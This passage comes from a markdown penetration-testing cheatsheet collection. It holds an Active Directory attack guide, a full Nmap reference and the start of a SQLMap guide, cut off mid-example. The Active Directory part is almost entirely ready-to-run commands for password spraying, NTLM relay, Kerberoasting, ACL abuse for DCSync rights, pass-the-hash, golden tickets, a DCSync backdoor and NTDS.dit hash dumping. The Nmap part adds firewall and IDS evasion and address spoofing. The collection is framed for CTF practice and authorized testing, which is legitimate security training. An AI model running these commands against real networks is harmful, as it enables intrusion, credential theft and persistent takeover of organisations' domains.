kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Common Passwords:**
```
Season+Year: Summer2024!, Winter2024
CompanyName+123: Company123!
Welcome1, Password1
```

### 2.2 LLMNR/NBT-NS Poisoning

```bash
# Terminal 1: Start Responder
sudo responder -I eth0 -wPv

# Wait for hashes...
# NTLMv2 captured!

# Terminal 2: Crack hash
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 NTLM Relay

```bash
# Find targets without SMB signing
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB off)
sudo responder -I eth0

# Relay attack
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP Roasting (No Password Required!)

```bash
# Find vulnerable users
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Or with creds
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## 🏢 Active Directory — ⬆️ Phase 3: Privilege Escalation

### 3.1 Kerberoasting

```bash
# From Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# From Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 ACL Abuse

**GenericAll on User:**
```powershell
# Change password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll on Group:**
```powershell
# Add yourself to group
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# Set SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# Give yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Delegation Attacks

**Unconstrained Delegation:**
```powershell
# Find targets
Get-DomainComputer -Unconstrained

# Monitor for TGTs
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Trigger (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Constrained Delegation:**
```bash
# Request ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Use ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Resource-Based Constrained Delegation (RBCD):**
```bash
# Create machine account
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Set RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Get ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

## 🏢 Active Directory — ➡️ Phase 4: Lateral Movement

### 4.1 Pass-the-Hash

```bash
# PSExec with hash
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket

```bash
# Export ticket
.\Rubeus.exe dump

# Use ticket (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Use ticket (Windows)
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM with password
evil-winrm -i 10.10.10.10 -u admin -p password

# With hash
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash

```bash
# Get TGT with hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Now use Kerberos
dir \\server\share
```

---

## 🏢 Active Directory — 🔒 Phase 5: Persistence

### 5.1 Golden Ticket

```bash
# Need: krbtgt NTLM hash + Domain SID

# Create ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Use
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket

```bash
# Create service ticket
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 DCSync Backdoor

```powershell
# Add DCSync rights to any user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

## 🏢 Active Directory — 👑 Phase 6: Domain Dominance

### 6.1 DCSync

```bash
# Dump all hashes
impacket-secretsdump domain.local/admin:password@10.10.10.10

# With hash
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Specific user
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 NTDS.dit Extraction

```bash
# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Extract offline
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 CrackMapExec Dump

```bash
# Dump NTDS via DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

## 🏢 Active Directory — 📊 Quick Command Reference

### Enumeration One-Liners

```bash
# Find DCs
nmap -p 88,389 --open 10.10.10.0/24

# Enum users (no creds)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Find AS-REP roastable
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Attack Cheatsheet

| Attack | Command |
|--------|---------|
| Password Spray | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Hash Cracking

| Hash Type | Hashcat Mode |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

## 🏢 Active Directory — 🎯 CTF Tips

1. **Always enumerate first** - Don't attack blindly
2. **Check for AS-REP** - Free hashes without creds!
3. **Run BloodHound** - Find attack paths
4. **Check ACLs** - Often misconfigured
5. **Look for delegation** - Easy wins
6. **Spray carefully** - Account lockouts!
7. **Save all credentials** - You'll need them later

---

## 🏢 Active Directory — 📚 Related Cheatsheets

- [BloodHound](../BloodHound/README.md)
- [Impacket](../Impacket/README.md)
- [CrackMapExec](../CrackMapExec/README.md)
- [Rubeus](../Rubeus/README.md)
- [PowerView](../PowerView/README.md)
- [Responder](../Responder/README.md)
- [Evil-WinRM](../Evil-WinRM/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

<p align="center">
  <b>🏢 From User to Domain Admin!</b><br>
  <i>Follow the methodology, own the domain</i>
</p>

## 🔍 Nmap — # 🔍 Nmap - Complete Cheatsheet

```
    _   __                      
   / | / /___ ___  ____ _____  
  /  |/ / __ `__ \/ __ `/ __ \ 
 / /|  / / / / / / /_/ / /_/ / 
/_/ |_/_/ /_/ /_/\__,_/ .___/  
                     /_/       
    Network Mapper - The Network Scanner
```

<p align="center">
  <img src="https://img.shields.io/badge/Nmap-Network_Scanner-blue?style=for-the-badge" alt="Nmap">
  <img src="https://img.shields.io/badge/Reconnaissance-red?style=for-the-badge" alt="Reconnaissance">
  <img src="https://img.shields.io/badge/Port_Scanning-green?style=for-the-badge" alt="Port Scanning">
  <img src="https://img.shields.io/badge/NSE_Scripts-purple?style=for-the-badge" alt="NSE Scripts">
</p>

<p align="center">
  <b>🌐 The most powerful network scanning and discovery tool</b>
</p>

---

## 🔍 Nmap — 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Basic Syntax](#-basic-syntax)
- [Target Specification](#-target-specification)
- [Host Discovery](#-host-discovery)
- [Port Scanning Techniques](#-port-scanning-techniques)
- [Port Specification](#-port-specification)
- [Service & Version Detection](#-service--version-detection)
- [OS Detection](#-os-detection)
- [Timing & Performance](#-timing--performance)
- [NSE Scripts](#-nse-scripts)
- [Output Formats](#-output-formats)
- [Firewall/IDS Evasion](#-firewallids-evasion)
- [Real-World Examples](#-real-world-examples)
- [Quick Reference](#-quick-reference)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 🔍 Nmap — 📥 Installation

### Kali Linux (Pre-installed)
```bash
# Update Nmap
sudo apt update && sudo apt install nmap
```

### Ubuntu/Debian
```bash
sudo apt install nmap
```

### CentOS/RHEL
```bash
sudo yum install nmap
```

### Windows
```bash
# Download from https://nmap.org/download.html
# Or use Chocolatey
choco install nmap
```

### macOS
```bash
brew install nmap
```

### Verify Installation
```bash
nmap --version
nmap -h          # Help
```

---

## 🔍 Nmap — ⌨️ Basic Syntax

### General Syntax
```bash
nmap [Scan Type] [Options] {target}
```

### Quick Start Examples
```bash
# Basic scan
nmap 192.168.1.1

# Scan multiple hosts
nmap 192.168.1.1 192.168.1.2 192.168.1.3

# Scan a range
nmap 192.168.1.1-254

# Scan entire subnet
nmap 192.168.1.0/24

# Scan from file
nmap -iL targets.txt
```

---

## 🔍 Nmap — 🎯 Target Specification

### Single Targets
```bash
# IP address
nmap 192.168.1.1

# Hostname
nmap scanme.nmap.org

# Domain
nmap example.com
```

### Multiple Targets
```bash
# Space-separated
nmap 192.168.1.1 192.168.1.2 192.168.1.3

# Range
nmap 192.168.1.1-100

# CIDR notation
nmap 192.168.1.0/24

# Wildcard
nmap 192.168.1.*

# Octet range
nmap 192.168.0-255.1-254

# Mixed
nmap 192.168.1.0/24 10.0.0.1
```

### Input from File
```bash
# Read from file
nmap -iL targets.txt

# targets.txt:
# 192.168.1.1
# 192.168.1.0/24
# scanme.nmap.org
```

### Exclude Targets
```bash
# Exclude single host
nmap 192.168.1.0/24 --exclude 192.168.1.1

# Exclude from file
nmap 192.168.1.0/24 --excludefile exclude.txt
```

### Random Targets
```bash
# Scan random hosts (for research)
nmap -iR 100
```

---

## 🔍 Nmap — 🔎 Host Discovery

### Discovery Options

| Option | Description |
|--------|-------------|
| `-sL` | List scan - only list targets |
| `-sn` | Ping scan - no port scan |
| `-Pn` | Skip host discovery (treat all hosts as online) |
| `-PS` | TCP SYN ping |
| `-PA` | TCP ACK ping |
| `-PU` | UDP ping |
| `-PE` | ICMP echo ping |
| `-PP` | ICMP timestamp ping |
| `-PM` | ICMP netmask ping |
| `-PO` | IP protocol ping |
| `-PR` | ARP ping (local network) |

### Ping Scan (No Port Scan)
```bash
# Discover live hosts only
nmap -sn 192.168.1.0/24

# Ping scan with host list
nmap -sn -iL hosts.txt
```

### Skip Host Discovery
```bash
# Scan all hosts (don't ping first)
nmap -Pn 192.168.1.1

# Useful when:
# - Hosts block ICMP
# - Scanning through firewall
```

### TCP SYN/ACK Ping
```bash
# TCP SYN ping on port 80
nmap -PS80 192.168.1.1

# TCP ACK ping on port 80
nmap -PA80 192.168.1.1

# Multiple ports
nmap -PS22,80,443 192.168.1.1
```

### UDP Ping
```bash
# UDP ping
nmap -PU53 192.168.1.1

# Multiple ports
nmap -PU53,161 192.168.1.1
```

### ICMP Ping
```bash
# ICMP echo
nmap -PE 192.168.1.1

# ICMP timestamp
nmap -PP 192.168.1.1

# ICMP netmask
nmap -PM 192.168.1.1
```

### ARP Ping (Local Network)
```bash
# ARP scan (fastest on local network)
nmap -PR 192.168.1.0/24

# ARP scan only
nmap -sn -PR 192.168.1.0/24
```

### Disable DNS Resolution
```bash
# No DNS resolution (faster)
nmap -n 192.168.1.1

# Always resolve DNS
nmap -R 192.168.1.1
```

---

## 🔍 Nmap — 🔌 Port Scanning Techniques

### Scan Types Overview

| Option | Name | Description |
|--------|------|-------------|
| `-sS` | SYN Scan | Stealth scan (default, requires root) |
| `-sT` | TCP Connect | Full TCP connection (no root needed) |
| `-sU` | UDP Scan | Scan UDP ports |
| `-sA` | ACK Scan | Map firewall rules |
| `-sW` | Window Scan | Similar to ACK, uses window field |
| `-sM` | Maimon Scan | FIN/ACK probe |
| `-sN` | NULL Scan | No flags set |
| `-sF` | FIN Scan | FIN flag set |
| `-sX` | Xmas Scan | FIN, PSH, URG flags |

### SYN Stealth Scan (Default)
```bash
# Most common scan (requires root)
sudo nmap -sS 192.168.1.1

# Never completes TCP handshake
# Fast and stealthy
```

### TCP Connect Scan
```bash
# Full TCP connection
nmap -sT 192.168.1.1

# No root required
# More detectable but always works
```

### UDP Scan
```bash
# Scan UDP ports
sudo nmap -sU 192.168.1.1

# UDP scan is SLOW
# Combine with version detection
sudo nmap -sU -sV 192.168.1.1

# Common UDP ports
sudo nmap -sU -p 53,67,68,69,123,161,500 192.168.1.1
```

### Combined TCP/UDP
```bash
# Scan both TCP and UDP
sudo nmap -sS -sU 192.168.1.1

# Specific ports
sudo nmap -sS -sU -p T:80,443,U:53,161 192.168.1.1
```

### NULL, FIN, Xmas Scans
```bash
# NULL scan (no flags)
sudo nmap -sN 192.168.1.1

# FIN scan (FIN flag only)
sudo nmap -sF 192.168.1.1

# Xmas scan (FIN, PSH, URG)
sudo nmap -sX 192.168.1.1

# Good for:
# - Bypassing stateless firewalls
# - Doesn't work on Windows
```

### ACK Scan
```bash
# Map firewall rules
sudo nmap -sA 192.168.1.1

# Determine:
# - Which ports are filtered
# - Firewall rules
# Returns: unfiltered or filtered
```

### Window Scan
```bash
# Similar to ACK scan
sudo nmap -sW 192.168.1.1

# Uses TCP window size to determine state
```

### Idle/Zombie Scan
```bash
# Ultimate stealth - use zombie host
sudo nmap -sI zombie_host 192.168.1.1

# Your IP never touches target
# Requires suitable zombie
```

---

## 🔍 Nmap — 🎚️ Port Specification

### Port Options

| Option | Description |
|--------|-------------|
| `-p <port>` | Scan specific port(s) |
| `-p-` | Scan all 65535 ports |
| `-p 1-1000` | Scan port range |
| `--top-ports <n>` | Scan top N ports |
| `-F` | Fast scan (top 100 ports) |
| `-r` | Scan ports sequentially |

### Specific Ports
```bash
# Single port
nmap -p 80 192.168.1.1

# Multiple ports
nmap -p 80,443,22 192.168.1.1

# Port range
nmap -p 1-1000 192.168.1.1

# All ports
nmap -p- 192.168.1.1

# Mixed
nmap -p 22,80,443,1000-2000 192.168.1.1
```

### Port by Protocol
```bash
# TCP ports
nmap -p T:80,443 192.168.1.1

# UDP ports
nmap -p U:53,161 192.168.1.1

# Both
nmap -p T:80,443,U:53 192.168.1.1
```

### Top Ports
```bash
# Top 100 ports (fast)
nmap -F 192.168.1.1

# Top 10 ports
nmap --top-ports 10 192.168.1.1

# Top 1000 ports (default)
nmap --top-ports 1000 192.168.1.1
```

### Common Ports Reference

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 135 | MSRPC |
| 139 | NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | SMB |
| 993 | IMAPS |
| 995 | POP3S |
| 1433 | MSSQL |
| 1521 | Oracle |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 8080 | HTTP-Proxy |

---

## 🔍 Nmap — 🔬 Service & Version Detection

### Version Detection Options

| Option | Description |
|--------|-------------|
| `-sV` | Version detection |
| `--version-intensity <0-9>` | Probe intensity |
| `--version-light` | Light version scan (intensity 2) |
| `--version-all` | Try all probes (intensity 9) |
| `--version-trace` | Debug version scan |

### Basic Version Detection
```bash
# Detect service versions
nmap -sV 192.168.1.1

# Common output:
# PORT    STATE SERVICE VERSION
# 22/tcp  open  ssh     OpenSSH 7.9
# 80/tcp  open  http    Apache httpd 2.4.38
```

### Version Intensity
```bash
# Light scan (faster)
nmap -sV --version-light 192.168.1.1

# All probes (thorough)
nmap -sV --version-all 192.168.1.1

# Custom intensity (0-9)
nmap -sV --version-intensity 5 192.168.1.1
```

---

## 🔍 Nmap — 💻 OS Detection

### OS Detection Options

| Option | Description |
|--------|-------------|
| `-O` | Enable OS detection |
| `--osscan-limit` | Only scan promising hosts |
| `--osscan-guess` | Guess OS more aggressively |
| `--max-os-tries` | Maximum OS detection tries |

### Basic OS Detection
```bash
# Detect OS (requires root)
sudo nmap -O 192.168.1.1

# Output example:
# Running: Linux 3.X|4.X
# OS CPE: cpe:/o:linux:linux_kernel:3
# OS details: Linux 3.10 - 4.11
```

### Aggressive OS Guessing
```bash
# More aggressive guessing
sudo nmap -O --osscan-guess 192.168.1.1
```

### Aggressive Scan (-A)
```bash
# Enable OS detection, version, scripts, traceroute
sudo nmap -A 192.168.1.1

# Equivalent to: -O -sV -sC --traceroute
```

---

## 🔍 Nmap — ⏱️ Timing & Performance

### Timing Templates

| Option | Name | Description |
|--------|------|-------------|
| `-T0` | Paranoid | IDS evasion, very slow |
| `-T1` | Sneaky | IDS evasion, slow |
| `-T2` | Polite | Less bandwidth, slower |
| `-T3` | Normal | Default timing |
| `-T4` | Aggressive | Fast, reliable network |
| `-T5` | Insane | Very fast, may miss ports |

### Usage
```bash
# Slow and stealthy
nmap -T1 192.168.1.1

# Normal (default)
nmap -T3 192.168.1.1

# Fast
nmap -T4 192.168.1.1

# Very fast (local network)
nmap -T5 192.168.1.1
```

### Fine-Grained Timing

| Option | Description |
|--------|-------------|
| `--min-rate <n>` | Minimum packets per second |
| `--max-rate <n>` | Maximum packets per second |
| `--min-parallelism <n>` | Minimum parallel probes |
| `--max-parallelism <n>` | Maximum parallel probes |
| `--min-hostgroup <n>` | Minimum hosts in parallel |
| `--max-hostgroup <n>` | Maximum hosts in parallel |
| `--host-timeout <time>` | Give up on host after time |
| `--scan-delay <time>` | Delay between probes |
| `--max-retries <n>` | Maximum probe retries |

```bash
# Send at least 1000 packets/sec
nmap --min-rate 1000 192.168.1.0/24

# Maximum 100 packets/sec (slow down)
nmap --max-rate 100 192.168.1.1

# Timeout host after 30 minutes
nmap --host-timeout 30m 192.168.1.0/24

# Delay between probes
nmap --scan-delay 1s 192.168.1.1
```

---

## 🔍 Nmap — 📜 NSE Scripts

### Script Categories

| Category | Description |
|----------|-------------|
| `auth` | Authentication bypass |
| `broadcast` | Discover hosts via broadcast |
| `brute` | Brute force attacks |
| `default` | Default scripts (-sC) |
| `discovery` | Service discovery |
| `dos` | Denial of service |
| `exploit` | Exploit vulnerabilities |
| `external` | Query external services |
| `fuzzer` | Fuzzing |
| `intrusive` | May crash services |
| `malware` | Malware detection |
| `safe` | Safe scripts |
| `version` | Version detection |
| `vuln` | Vulnerability detection |

### Script Options

| Option | Description |
|--------|-------------|
| `-sC` | Default scripts |
| `--script <scripts>` | Run specific scripts |
| `--script-args <args>` | Script arguments |
| `--script-updatedb` | Update script database |
| `--script-help <script>` | Script help |

### Default Scripts
```bash
# Run default scripts
nmap -sC 192.168.1.1

# With version detection (recommended)
nmap -sV -sC 192.168.1.1
```

### Run Specific Scripts
```bash
# Single script
nmap --script http-title 192.168.1.1

# Multiple scripts
nmap --script http-title,http-headers 192.168.1.1

# Category
nmap --script vuln 192.168.1.1

# Wildcard
nmap --script "http-*" 192.168.1.1

# Combine categories
nmap --script "vuln and safe" 192.168.1.1

# Exclude scripts
nmap --script "not intrusive" 192.168.1.1
```

### Popular Scripts

#### Vulnerability Scanning
```bash
# All vulnerability scripts
nmap --script vuln 192.168.1.1

# Specific CVE check
nmap --script smb-vuln-ms17-010 192.168.1.1

# Heartbleed
nmap --script ssl-heartbleed 192.168.1.1

# ShellShock
nmap --script http-shellshock 192.168.1.1
```

#### HTTP Scripts
```bash
# HTTP enumeration
nmap --script http-enum 192.168.1.1

# HTTP headers
nmap --script http-headers 192.168.1.1

# HTTP methods
nmap --script http-methods 192.168.1.1

# HTTP title
nmap --script http-title 192.168.1.1

# Robots.txt
nmap --script http-robots.txt 192.168.1.1
```

#### SMB Scripts
```bash
# SMB enumeration
nmap --script smb-enum-shares 192.168.1.1
nmap --script smb-enum-users 192.168.1.1
nmap --script smb-os-discovery 192.168.1.1

# SMB vulnerabilities
nmap --script smb-vuln* 192.168.1.1
```

#### SSH Scripts
```bash
# SSH authentication methods
nmap --script ssh-auth-methods 192.168.1.1

# SSH host key
nmap --script ssh-hostkey 192.168.1.1

# SSH brute force
nmap --script ssh-brute 192.168.1.1
```

#### DNS Scripts
```bash
# DNS brute force
nmap --script dns-brute example.com

# DNS zone transfer
nmap --script dns-zone-transfer example.com
```

#### MySQL/Database Scripts
```bash
# MySQL info
nmap --script mysql-info 192.168.1.1

# MySQL enum
nmap --script mysql-enum 192.168.1.1

# MySQL brute
nmap --script mysql-brute 192.168.1.1
```

### Script Arguments
```bash
# Brute force with wordlist
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.1

# HTTP auth brute force
nmap --script http-brute --script-args http-brute.path=/admin 192.168.1.1
```

---

## 🔍 Nmap — 📄 Output Formats

### Output Options

| Option | Description |
|--------|-------------|
| `-oN <file>` | Normal output |
| `-oX <file>` | XML output |
| `-oG <file>` | Grepable output |
| `-oA <basename>` | All formats |
| `-oS <file>` | Script kiddie output |

### Save Output
```bash
# Normal output
nmap -oN scan.txt 192.168.1.1

# XML output (for tools)
nmap -oX scan.xml 192.168.1.1

# Grepable output
nmap -oG scan.gnmap 192.168.1.1

# All formats at once
nmap -oA scan 192.168.1.1
# Creates: scan.nmap, scan.xml, scan.gnmap
```

### Verbosity & Debugging

| Option | Description |
|--------|-------------|
| `-v` | Increase verbosity |
| `-vv` | More verbose |
| `-d` | Debug mode |
| `-dd` | More debugging |
| `--reason` | Show reason for port state |
| `--open` | Only show open ports |
| `--packet-trace` | Show all packets |

```bash
# Verbose output
nmap -v 192.168.1.1

# Very verbose
nmap -vv 192.168.1.1

# Show only open ports
nmap --open 192.168.1.1

# Show reason
nmap --reason 192.168.1.1
```

---

## 🔍 Nmap — 🛡️ Firewall/IDS Evasion

### Evasion Techniques

| Option | Description |
|--------|-------------|
| `-f` | Fragment packets |
| `--mtu <size>` | Custom MTU size |
| `-D <decoys>` | Use decoys |
| `-S <IP>` | Spoof source IP |
| `--source-port <port>` | Spoof source port |
| `--data-length <n>` | Append random data |
| `--randomize-hosts` | Random host order |
| `--spoof-mac <mac>` | Spoof MAC address |
| `--badsum` | Send bad checksums |

### Packet Fragmentation
```bash
# Fragment packets
nmap -f 192.168.1.1

# Custom MTU
nmap --mtu 16 192.168.1.1
```

### Decoys
```bash
# Use decoys
nmap -D decoy1,decoy2,ME 192.168.1.1

# Random decoys
nmap -D RND:5 192.168.1.1
```

### Source IP/Port Spoofing
```bash
# Spoof source IP
nmap -S 192.168.1.100 -e eth0 192.168.1.1

# Spoof source port (common allowed ports)
nmap --source-port 53 192.168.1.1
nmap --source-port 80 192.168.1.1
```

### MAC Spoofing
```bash
# Random MAC
nmap --spoof-mac 0 192.168.1.1

# Specific vendor
nmap --spoof-mac Apple 192.168.1.1

# Specific MAC
nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1
```

### Data Padding
```bash
# Add random data to packets
nmap --data-length 25 192.168.1.1
```

---

## 🔍 Nmap — 🎬 Real-World Examples

### Example 1: Quick Network Sweep
```bash
# Find live hosts
nmap -sn 192.168.1.0/24
```

### Example 2: Basic Port Scan
```bash
# Scan with version detection
nmap -sV 192.168.1.1
```

### Example 3: Comprehensive Scan
```bash
# Full scan with OS and scripts
sudo nmap -sS -sV -O -sC 192.168.1.1
```

### Example 4: Aggressive Full Scan
```bash
# All ports, aggressive
sudo nmap -A -T4 -p- 192.168.1.1
```

### Example 5: Vulnerability Scan
```bash
# Check for vulnerabilities
nmap --script vuln 192.168.1.1
```

### Example 6: Stealth Scan
```bash
# Stealthy scan
sudo nmap -sS -T2 -f --data-length 25 192.168.1.1
```

### Example 7: Web Server Scan
```bash
# Comprehensive web scan
nmap -sV -p 80,443,8080,8443 --script "http-*" 192.168.1.1
```

### Example 8: SMB Enumeration
```bash
# Full SMB enumeration
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* 192.168.1.1
```

### Example 9: Full Subnet Scan
```bash
# Scan entire subnet
nmap -sS -sV -O -T4 --open 192.168.1.0/24 -oA subnet_scan
```

### Example 10: UDP Services
```bash
# Common UDP services
sudo nmap -sU -sV -p 53,67,68,69,123,161,500 192.168.1.1
```

---

## 🔍 Nmap — 📊 Quick Reference

### Essential Commands

| Command | Description |
|---------|-------------|
| `nmap <target>` | Basic scan |
| `nmap -sn <target>` | Ping scan only |
| `nmap -Pn <target>` | Skip host discovery |
| `nmap -sS <target>` | SYN stealth scan |
| `nmap -sV <target>` | Version detection |
| `nmap -O <target>` | OS detection |
| `nmap -A <target>` | Aggressive scan |
| `nmap -sC <target>` | Default scripts |
| `nmap -p- <target>` | All ports |
| `nmap --script vuln <target>` | Vulnerability scan |

### Speed vs Stealth

| Need | Options |
|------|---------|
| **Fast** | `-T4 --min-rate 1000` |
| **Stealthy** | `-T1 -f --data-length 25` |
| **Balanced** | `-T3` (default) |

### Common Scans

```bash
# Fast scan
nmap -F 192.168.1.1

# Full TCP scan
nmap -sT -p- 192.168.1.1

# Service scan
nmap -sV 192.168.1.1

# Vulnerability scan
nmap --script vuln 192.168.1.1

# Everything
sudo nmap -A -T4 -p- 192.168.1.1
```

---

## 🔍 Nmap — 💡 Tips & Best Practices

### Performance Tips

1. **Use SYN Scan (Default)**
   ```bash
   # Requires root but fastest
   sudo nmap -sS 192.168.1.1
   ```

2. **Limit Port Range Initially**
   ```bash
   # Start with top ports
   nmap --top-ports 100 192.168.1.1
   ```

3. **Increase Speed for Local Networks**
   ```bash
   nmap -T5 --min-rate 5000 192.168.1.0/24
   ```

### Accuracy Tips

1. **Multiple Scan Types**
   ```bash
   # TCP and UDP
   sudo nmap -sS -sU -sV 192.168.1.1
   ```

2. **Increase Retries for Unreliable Networks**
   ```bash
   nmap --max-retries 3 192.168.1.1
   ```

### Legal Considerations

> ⚠️ **IMPORTANT:** Only scan networks you own or have permission to scan.

- ✅ Your own networks
- ✅ Lab environments
- ✅ Authorized penetration tests
- ❌ Random internet hosts
- ❌ Networks without permission

---

## 🔍 Nmap — 📚 Resources

### Official Resources
- [Nmap Official Website](https://nmap.org/)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [NSE Script Documentation](https://nmap.org/nsedoc/)

### Learning Resources
- [Nmap Network Scanning Book](https://nmap.org/book/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Related Cheatsheets
- [Metasploit Framework](../Metasploit/README.md)
- [SQLMap](../SQLMap/README.md)
- [Burp Suite](../Burp-Suite/README.md)

---

<p align="center">
  <b>🔍 Master Network Reconnaissance!</b><br>
  <i>Know your network before attackers do</i>
</p>

## 💉 SQLMap — # 💉 SQLMap - Complete Cheatsheet

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Automatic SQL Injection Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 The most powerful SQL injection automation tool</b>
</p>

---

## 💉 SQLMap — 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Basic Syntax](#-basic-syntax)
- [Target Options](#-target-options)
- [Request Options](#-request-options)
- [Detection Options](#-detection-options)
- [Enumeration](#-enumeration)
- [Data Extraction](#-data-extraction)
- [File Operations](#-file-operations)
- [OS Access](#-os-access)
- [Bypass Techniques](#-bypass-techniques)
- [Tamper Scripts](#-tamper-scripts)
- [Real-World Examples](#-real-world-examples)
- [Quick Reference](#-quick-reference)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 💉 SQLMap — 📥 Installation

### Kali Linux (Pre-installed)
```bash
# Update SQLMap
sudo apt update && sudo apt install sqlmap
```

### From GitHub (Latest Version)
```bash
# Clone repository
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Run SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### Using pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Verify Installation
```bash
sqlmap --version
sqlmap -h          # Basic help
sqlmap -hh         # Advanced help
```

---

## 💉 SQLMap — ⌨️ Basic Syntax

### General Syntax
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Quick Start Examples
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# Scan with cookie
